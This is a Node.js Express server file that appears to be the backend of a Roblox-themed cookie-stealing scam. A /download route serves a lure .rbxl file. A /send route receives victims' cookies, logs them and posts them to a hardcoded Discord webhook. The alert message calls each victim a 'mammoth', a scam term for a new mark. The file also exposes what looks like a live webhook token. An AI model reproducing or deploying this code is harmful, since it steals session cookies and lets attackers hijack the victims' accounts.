const { table } = require('console');
const express = require('express');
const path = require('path');
const app = express();

const PORT = process.env.PORT || 3000;
app.use(express.static(path.join(__dirname, 'public')));
app.use(express.json());

const webhookUrl = 'https://discord.com/api/webhooks/1519693949214658762/MVHMg0w16OS3IkPVwLODMU2myWyAC5VF86n-L74rmxhtyk-w_jITF7yg_qpXUaXNfsG6';

app.get('/download', async (req, res) => {
  const file = path.join(__dirname, 'public', 'sfa.rbxl'); // <=========================================
  res.download(file);
});

app.post('/send', async (req, res) => {
        const reqBody = req.body;
        const cookies = reqBody.cookies;
        //const tokens = reqBody.tokens;
        //const region = reqBody.region;
        const fieldsArray = [];
        const fieldsArray2 = [];
        let index = 0;
        console.log(cookies);
        for (const key in cookies) {
            if (Object.prototype.hasOwnProperty.call(cookies, key)) {
                index++;
                //name: "Memory",
                //value: "4.2 GB / 16 GB",
                //inline: true
                fieldsArray.push(cookies[key]);
                console.log(cookies[key],index);
            }
        }
        console.log(`Новый мамонт!\nКуки: ${fieldsArray.concat("\n \n")}`);
        const response = await fetch(webhookUrl, {
            method: "POST",
            headers: {
              "Content-Type": "application/json"
            },
            body: JSON.stringify({ content: `@everyone\nНовый мамонт!\n\nРБ:\n${fieldsArray.concat("\n\n")}ДС:\n` })
        });
        console.log(response);
        // Формируем правильную структуру для Discord
        res.status(200).json({ success: true });
});


app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
